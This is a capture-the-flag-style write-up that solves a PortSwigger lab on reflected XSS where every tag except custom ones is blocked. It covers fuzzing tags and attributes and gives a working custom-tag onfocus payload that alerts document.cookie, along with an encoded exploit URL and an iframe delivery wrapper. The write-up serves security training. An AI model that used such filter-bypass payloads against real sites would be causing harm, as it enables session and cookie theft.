
# Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/contexts

---------------------------------------------

The search term is reflected inside an `h1` HTML element:



<img width="262" height="62" alt="1" src="https://github.com/user-attachments/assets/3872242a-9206-43ee-b231-04b35c995029" />



I used the following template payload for testing with Intruder:

```
<tag attrib=alert(1)>text</tag>
```

I tested the candidate attributes first:



<img width="809" height="365" alt="2" src="https://github.com/user-attachments/assets/82ebb499-9616-4b14-a741-95d032049298" />


The results indicate that the tested attributes are accepted:



<img width="503" height="126" alt="3" src="https://github.com/user-attachments/assets/d8197338-7c35-40c6-ae33-841941c373df" />



Next, I tested which tags are accepted:



<img width="814" height="428" alt="4" src="https://github.com/user-attachments/assets/bc323fe2-d07a-4a65-8375-2567fade3101" />



The following tag names passed the tests:
• animatetransform
• animatemotion
• custom tags
• animate
• iframe2
• audio2
• image2
• image3
• input2
• input3
• input4
• video2
• img2
• set
• a2


<img width="503" height="351" alt="5" src="https://github.com/user-attachments/assets/e99940b9-8aba-44e8-8f1b-e780d1303be2" />


One payload that triggers the alert is:

```
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

```
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E
```

```
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```

